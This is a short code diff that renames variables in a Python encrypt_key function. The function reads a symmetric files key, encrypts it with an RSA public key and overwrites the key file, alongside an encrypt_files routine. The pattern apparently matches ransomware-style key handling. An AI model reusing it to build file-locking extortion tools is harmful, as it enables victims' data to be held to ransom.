@@ -48,13 +48,13 @@ def encrypt_files(paths, key):
 def encrypt_key(pubKey):
     with open('keys\\pubKey.pem', mode='rb'):
         f = open("keys\\files_key.key", mode='rb')
-        fernet_key = f.read()
+        files_key = f.read()
         f.close()
 
-        encrypted_fernet_key = rsa.encrypt(fernet_key, pubKey)
+        encrypted_files_key = rsa.encrypt(files_key, pubKey)
 
         f = open("keys\\files_key.key", 'wb')
-        f.write(bytearray(encrypted_fernet_key))
+        f.write(bytearray(encrypted_files_key))
         f.close()    
         
 
